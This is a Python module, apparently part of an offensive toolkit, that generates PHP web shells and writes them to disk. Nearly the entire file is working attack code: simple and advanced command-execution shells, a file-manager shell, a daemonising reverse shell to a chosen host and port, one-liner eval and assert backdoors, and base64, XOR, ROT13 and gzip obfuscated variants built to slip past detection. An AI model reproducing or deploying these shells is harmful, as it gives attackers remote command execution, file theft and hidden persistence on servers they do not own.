#!/usr/bin/env python3
# app/exploitation/webshell_gen.py - Web Shell Generator

import sys
import os
import base64
import time
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE, REPORTS_DIR
from utils import Logger, pause, clear_screen, InputValidator, ReportWriter

class WebShellGenerator:
    def __init__(self):
        self.reports_dir = os.path.join(REPORTS_DIR, 'exploitation', 'webshells', 'generated')
        os.makedirs(self.reports_dir, exist_ok=True)
    
    def run(self):
        """Main web shell generator menu"""
        while True:
            clear_screen()
            print(f"\n{C_TITLE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó")
            print(f"‚ïë      WEB SHELL GENERATOR                 ‚ïë")
            print(f"‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù{C_RESET}\n")
            
            print(f"{C_INFO}  [1]  PHP Web Shells{C_RESET}")
            print(f"{C_INFO}  [2]  ASP Web Shells{C_RESET}")
            print(f"{C_INFO}  [3]  ASPX Web Shells{C_RESET}")
            print(f"{C_INFO}  [4]  JSP Web Shells{C_RESET}")
            print(f"{C_INFO}  [5]  Python Web Shells{C_RESET}")
            print(f"{C_INFO}  [6]  Perl Web Shells{C_RESET}")
            print(f"{C_INFO}  [7]  Obfuscated Shells{C_RESET}")
            print(f"{C_INFO}  [8]  Generate All{C_RESET}")
            print(f"\n{C_WARN}  [0]  Back{C_RESET}\n")
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.php_shells()
            elif choice == '2':
                self.asp_shells()
            elif choice == '3':
                self.aspx_shells()
            elif choice == '4':
                self.jsp_shells()
            elif choice == '5':
                self.python_shells()
            elif choice == '6':
                self.perl_shells()
            elif choice == '7':
                self.obfuscated_shells()
            elif choice == '8':
                self.generate_all()
            else:
                Logger.error("Invalid choice!")
                time.sleep(1)
    
    def php_shells(self):
        """Generate PHP web shells"""
        clear_screen()
        print(f"\n{C_TITLE}‚ïê‚ïê‚ïê PHP WEB SHELLS ‚ïê‚ïê‚ïê{C_RESET}\n")
        
        print(f"{C_INFO}PHP Shell Types:{C_RESET}")
        print(f"  [1] Simple Command Shell")
        print(f"  [2] Advanced Command Shell")
        print(f"  [3] File Manager Shell")
        print(f"  [4] Reverse Shell")
        print(f"  [5] Mini Shell")
        print(f"  [6] One-Liner Shell")
        print(f"  [7] All PHP Shells\n")
        
        choice = input(f"{C_INFO}Select shell [1-7]: {C_RESET}").strip()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if choice == '1':
            shell = self._php_simple()
            filename = f"php_simple_{timestamp}.php"
        elif choice == '2':
            shell = self._php_advanced()
            filename = f"php_advanced_{timestamp}.php"
        elif choice == '3':
            shell = self._php_file_manager()
            filename = f"php_filemanager_{timestamp}.php"
        elif choice == '4':
            lhost = input(f"{C_INFO}Enter LHOST: {C_RESET}").strip()
            lport = input(f"{C_INFO}Enter LPORT [4444]: {C_RESET}").strip() or "4444"
            shell = self._php_reverse_shell(lhost, lport)
            filename = f"php_reverse_{timestamp}.php"
        elif choice == '5':
            shell = self._php_mini()
            filename = f"php_mini_{timestamp}.php"
        elif choice == '6':
            shell = self._php_oneliner()
            filename = f"php_oneliner_{timestamp}.php"
        elif choice == '7':
            self._generate_all_php(timestamp)
            pause()
            return
        else:
            Logger.error("Invalid choice!")
            pause()
            return
        
        self._save_shell(filename, shell, "PHP")
        pause()
    
    def _php_simple(self):
        """Simple PHP shell"""
        return """<?php
// Simple PHP Command Shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell</title>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
        input[type=text] { width: 80%; padding: 10px; background: #2d2d2d; color: #00ff00; border: 1px solid #00ff00; }
        input[type=submit] { padding: 10px 20px; background: #00ff00; color: #000; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>PHP Command Shell</h2>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command..." autofocus>
        <input type="submit" value="Execute">
    </form>
</body>
</html>"""
    
    def _php_advanced(self):
        """Advanced PHP shell"""
        return """<?php
// Advanced PHP Shell
error_reporting(0);
set_time_limit(0);

function execute_cmd($cmd) {
    if(function_exists('system')) {
        @ob_start();
        @system($cmd);
        $output = @ob_get_contents();
        @ob_end_clean();
        return $output;
    } elseif(function_exists('exec')) {
        @exec($cmd, $results);
        return implode("\\n", $results);
    } elseif(function_exists('shell_exec')) {
        return @shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $output = @ob_get_contents();
        @ob_end_clean();
        return $output;
    } elseif(function_exists('proc_open')) {
        $process = @proc_open($cmd, array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        ), $pipes);
        if(is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            return $output;
        }
    }
    return "No execution functions available";
}

if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    $output = execute_cmd($cmd);
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
    die;
}

if(isset($_FILES['file'])){
    if(move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])){
        echo "File uploaded: " . $_FILES['file']['name'];
    } else {
        echo "Upload failed!";
    }
    die;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Advanced PHP Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #0f0; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        h1 { color: #0f0; margin-bottom: 20px; text-shadow: 0 0 10px #0f0; }
        .info-box { background: #1a1a1a; padding: 15px; margin-bottom: 20px; border: 1px solid #0f0; }
        .info-box div { margin: 5px 0; }
        .section { background: #1a1a1a; padding: 20px; margin-bottom: 20px; border: 1px solid #0f0; }
        .section h2 { color: #0f0; margin-bottom: 15px; }
        input[type=text] { width: 100%; padding: 10px; background: #0a0a0a; color: #0f0; border: 1px solid #0f0; margin-bottom: 10px; }
        button { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold; }
        button:hover { background: #0a0; }
        pre { background: #0a0a0a; padding: 15px; border: 1px solid #0f0; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ö° Advanced PHP Shell</h1>
        
        <div class="info-box">
            <div><strong>PHP Version:</strong> <?php echo phpversion(); ?></div>
            <div><strong>System:</strong> <?php echo php_uname(); ?></div>
            <div><strong>User:</strong> <?php echo get_current_user(); ?></div>
            <div><strong>Current Dir:</strong> <?php echo getcwd(); ?></div>
            <div><strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?></div>
            <div><strong>Your IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></div>
        </div>
        
        <div class="section">
            <h2>Command Execution</h2>
            <form method="POST">
                <input type="text" name="cmd" placeholder="Enter command (e.g., ls -la, whoami, id)" autofocus>
                <button type="submit">Execute</button>
            </form>
        </div>
        
        <div class="section">
            <h2>File Upload</h2>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file" style="color: #0f0;">
                <button type="submit">Upload</button>
            </form>
        </div>
        
        <div class="section">
            <h2>Quick Commands</h2>
            <button onclick="runCmd('whoami')">whoami</button>
            <button onclick="runCmd('id')">id</button>
            <button onclick="runCmd('pwd')">pwd</button>
            <button onclick="runCmd('ls -la')">ls -la</button>
            <button onclick="runCmd('cat /etc/passwd')">passwd</button>
            <button onclick="runCmd('uname -a')">uname</button>
            <button onclick="runCmd('ifconfig')">ifconfig</button>
        </div>
    </div>
    
    <script>
        function runCmd(cmd) {
            window.location.href = '?cmd=' + encodeURIComponent(cmd);
        }
    </script>
</body>
</html>"""
    
    def _php_file_manager(self):
        """PHP file manager shell"""
        return """<?php
// PHP File Manager Shell
error_reporting(0);

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

if(isset($_GET['download'])){
    $file = $_GET['download'];
    if(file_exists($file)){
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        die;
    }
}

if(isset($_POST['upload'])){
    $target = $current_dir . '/' . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
        echo "<script>alert('Upload successful!');</script>";
    }
}

if(isset($_POST['delete'])){
    $file = $_POST['file'];
    if(file_exists($file)){
        unlink($file) ? print("<script>alert('Deleted!');</script>") : print("<script>alert('Delete failed!');</script>");
    }
}

if(isset($_POST['rename'])){
    $old = $_POST['old_name'];
    $new = $_POST['new_name'];
    rename($old, $new) ? print("<script>alert('Renamed!');</script>") : print("<script>alert('Rename failed!');</script>");
}

if(isset($_POST['create_file'])){
    $file = $current_dir . '/' . $_POST['filename'];
    file_put_contents($file, $_POST['content']);
    echo "<script>alert('File created!');</script>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP File Manager</title>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
        .path { background: #2d2d2d; padding: 10px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #00ff00; }
        th { background: #2d2d2d; }
        a { color: #00ff00; text-decoration: none; }
        button { background: #00ff00; color: #000; padding: 5px 10px; border: none; cursor: pointer; margin: 2px; }
    </style>
</head>
<body>
    <h2>üìÅ PHP File Manager</h2>
    
    <div class="path">
        <strong>Current Directory:</strong> <?php echo $current_dir; ?>
    </div>
    
    <h3>Upload File</h3>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit" name="upload">Upload</button>
    </form>
    
    <h3>Create File</h3>
    <form method="POST">
        <input type="text" name="filename" placeholder="Filename">
        <textarea name="content" placeholder="Content..." rows="5" cols="50"></textarea>
        <button type="submit" name="create_file">Create</button>
    </form>
    
    <h3>Files & Directories</h3>
    <table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
        <?php
        if($current_dir != '/'){
            $parent = dirname($current_dir);
            echo "<tr><td><a href='?dir=$parent'>üìÅ ..</a></td><td>-</td><td>-</td><td>-</td></tr>";
        }
        
        $files = scandir($current_dir);
        foreach($files as $file){
            if($file == '.' || $file == '..') continue;
            
            $full_path = $current_dir . '/' . $file;
            $size = is_file($full_path) ? filesize($full_path) : '-';
            $perms = substr(sprintf('%o', fileperms($full_path)), -4);
            
            if(is_dir($full_path)){
                echo "<tr>";
                echo "<td><a href='?dir=$full_path'>üìÅ $file</a></td>";
                echo "<td>$size</td>";
                echo "<td>$perms</td>";
                echo "<td>-</td>";
                echo "</tr>";
            } else {
                echo "<tr>";
                echo "<td>üìÑ $file</td>";
                echo "<td>$size</td>";
                echo "<td>$perms</td>";
                echo "<td>";
                echo "<a href='?download=$full_path'><button>Download</button></a>";
                echo "<form method='POST' style='display:inline;'><input type='hidden' name='file' value='$full_path'><button type='submit' name='delete'>Delete</button></form>";
                echo "</td>";
                echo "</tr>";
            }
        }
        ?>
    </table>
</body>
</html>"""
    
    def _php_reverse_shell(self, lhost, lport):
        """PHP reverse shell"""
        return f"""<?php
// PHP Reverse Shell
// LHOST: {lhost}
// LPORT: {lport}

set_time_limit(0);
$VERSION = "1.0";
$ip = '{lhost}';
$port = {lport};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    
    if ($pid == -1) {{
        printit("ERROR: Can't fork");
        exit(1);
    }}
    
    if ($pid) {{
        exit(0);
    }}
    
    if (posix_setsid() == -1) {{
        printit("Error: Can't setsid()");
        exit(1);
    }}

    $daemon = 1;
}} else {{
    printit("WARNING: Failed to daemonise.");
}}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    printit("$errstr ($errno)");
    exit(1);
}}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
    printit("ERROR: Can't spawn shell");
    exit(1);
}}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {{
    if (feof($sock)) {{
        printit("ERROR: Shell connection terminated");
        break;
    }}

    if (feof($pipes[1])) {{
        printit("ERROR: Shell process terminated");
        break;
    }}

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {{
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }}

    if (in_array($pipes[1], $read_a)) {{
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }}

    if (in_array($pipes[2], $read_a)) {{
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {{
    if (!$daemon) {{
        print "$string\\n";
    }}
}}

?>"""
    
    def _php_mini(self):
        """Mini PHP shell"""
        return """<?php
@eval($_POST['cmd']);
?>"""
    
    def _php_oneliner(self):
        """PHP one-liner shells"""
        return """<?php
// PHP One-Liner Web Shells

// Shell 1: Simple
echo "Shell 1: "; system($_GET['cmd']);

// Shell 2: Eval
// <?php eval($_POST['cmd']); ?>

// Shell 3: Assert
// <?php assert($_POST['cmd']); ?>

// Shell 4: Preg_replace (PHP < 5.5)
// <?php preg_replace('/.*/e',$_POST['cmd'],''); ?>

// Shell 5: Create_function
// <?php $a = create_function('',$_POST['cmd']); $a(); ?>

// Shell 6: Include
// <?php include($_GET['file']); ?>

// Shell 7: File_get_contents
// <?php echo file_get_contents($_GET['file']); ?>

// Shell 8: Array_map
// <?php array_map("assert", (array)$_REQUEST['cmd']); ?>

?>"""
    
    def _generate_all_php(self, timestamp):
        """Generate all PHP shells"""
        shells = {
            f"php_simple_{timestamp}.php": self._php_simple(),
            f"php_advanced_{timestamp}.php": self._php_advanced(),
            f"php_filemanager_{timestamp}.php": self._php_file_manager(),
            f"php_mini_{timestamp}.php": self._php_mini(),
            f"php_oneliner_{timestamp}.php": self._php_oneliner(),
        }
        
        Logger.info("Generating all PHP shells...")
        for filename, content in shells.items():
            filepath = os.path.join(self.reports_dir, filename)
            with open(filepath, 'w') as f:
                f.write(content)
            Logger.success(f"Generated: {filename}")
        
        Logger.info(f"\nAll shells saved to: {self.reports_dir}")
    
    def asp_shells(self):
        """Generate ASP shells"""
        Logger.warning("ASP shell generator - Under development")
        pause()
    
    def aspx_shells(self):
        """Generate ASPX shells"""
        Logger.warning("ASPX shell generator - Under development")
        pause()
    
    def jsp_shells(self):
        """Generate JSP shells"""
        Logger.warning("JSP shell generator - Under development")
        pause()
    
    def python_shells(self):
        """Generate Python shells"""
        Logger.warning("Python shell generator - Under development")
        pause()
    
    def perl_shells(self):
        """Generate Perl shells"""
        Logger.warning("Perl shell generator - Under development")
        pause()
    
    def obfuscated_shells(self):
        """Generate obfuscated shells"""
        clear_screen()
        print(f"\n{C_TITLE}‚ïê‚ïê‚ïê OBFUSCATED SHELLS ‚ïê‚ïê‚ïê{C_RESET}\n")
        
        print(f"{C_INFO}Obfuscation Techniques:{C_RESET}")
        print(f"  [1] Base64 Encoded PHP")
        print(f"  [2] XOR Encrypted PHP")
        print(f"  [3] ROT13 PHP")
        print(f"  [4] Gzip Compressed PHP\n")
        
        choice = input(f"{C_INFO}Select technique [1-4]: {C_RESET}").strip()
        
        if choice == '1':
            self._base64_php_shell()
        elif choice == '2':
            self._xor_php_shell()
        elif choice == '3':
            self._rot13_php_shell()
        elif choice == '4':
            self._gzip_php_shell()
        else:
            Logger.error("Invalid choice!")
        
        pause()
    
    def _base64_php_shell(self):
        """Base64 encoded PHP shell"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Simple shell to encode
        original = '<?php system($_GET["cmd"]); ?>'
        encoded = base64.b64encode(original.encode()).decode()
        
        shell = f"""<?php
// Base64 Encoded Shell
eval(base64_decode("{encoded}"));
?>"""
        
        filename = f"php_base64_{timestamp}.php"
        self._save_shell(filename, shell, "PHP Base64")
    
    def _xor_php_shell(self):
        """XOR encrypted PHP shell"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        shell = """<?php
// XOR Encrypted Shell
$key = "secret";
$payload = base64_decode("PUT_ENCODED_PAYLOAD_HERE");
$decoded = '';
for($i = 0; $i < strlen($payload); $i++) {
    $decoded .= $payload[$i] ^ $key[$i % strlen($key)];
}
eval($decoded);
?>"""
        
        filename = f"php_xor_{timestamp}.php"
        self._save_shell(filename, shell, "PHP XOR")
    
    def _rot13_php_shell(self):
        """ROT13 encoded PHP shell"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        shell = """<?php
// ROT13 Encoded Shell
eval(str_rot13('riny($_CBFG["pzq"]);'));
?>"""
        
        filename = f"php_rot13_{timestamp}.php"
        self._save_shell(filename, shell, "PHP ROT13")
    
    def _gzip_php_shell(self):
        """Gzip compressed PHP shell"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        shell = """<?php
// Gzip Compressed Shell
eval(gzinflate(base64_decode("PUT_COMPRESSED_PAYLOAD_HERE")));
?>"""
        
        filename = f"php_gzip_{timestamp}.php"
        self._save_shell(filename, shell, "PHP Gzip")
    
    def generate_all(self):
        """Generate all web shells"""
        clear_screen()
        print(f"\n{C_TITLE}‚ïê‚ïê‚ïê GENERATE ALL WEB SHELLS ‚ïê‚ïê‚ïê{C_RESET}\n")
        
        Logger.info("Generating all web shells...")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # PHP shells
        php_shells = {
            f"php_simple_{timestamp}.php": self._php_simple(),
            f"php_advanced_{timestamp}.php": self._php_advanced(),
            f"php_filemanager_{timestamp}.php": self._php_file_manager(),
            f"php_mini_{timestamp}.php": self._php_mini(),
            f"php_oneliner_{timestamp}.php": self._php_oneliner(),
        }
        
        count = 0
        for filename, content in php_shells.items():
            filepath = os.path.join(self.reports_dir, filename)
            with open(filepath, 'w') as f:
                f.write(content)
            count += 1
            Logger.success(f"[{count}] Generated: {filename}")
        
        Logger.success(f"\n‚úì Generated {count} web shells")
        Logger.info(f"Location: {self.reports_dir}")
        
        # Create index file
        index_file = os.path.join(self.reports_dir, f"index_{timestamp}.txt")
        with open(index_file, 'w') as f:
            f.write(ReportWriter.create_report_header("Web Shell Collection", ""))
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
            f.write(f"Total Shells: {count}\\n\\n")
            f.write("=" * 80 + "\\n")
            f.write("SHELL LIST\\n")
            f.write("=" * 80 + "\\n\\n")
            for filename in php_shells.keys():
                f.write(f"‚Ä¢ {filename}\\n")
        
        Logger.info(f"Index: {index_file}")
        
        pause()
    
    def _save_shell(self, filename, content, shell_type):
        """Save shell to file"""
        filepath = os.path.join(self.reports_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(content)
        
        Logger.success(f"{shell_type} shell generated!")
        Logger.info(f"Location: {filepath}")
        
        print(f"\\n{C_INFO}Shell Content:{C_RESET}")
        print("-" * 80)
        print(content[:500] + "..." if len(content) > 500 else content)
        print("-" * 80)

if __name__ == "__main__":
    generator = WebShellGenerator()
    generator.run()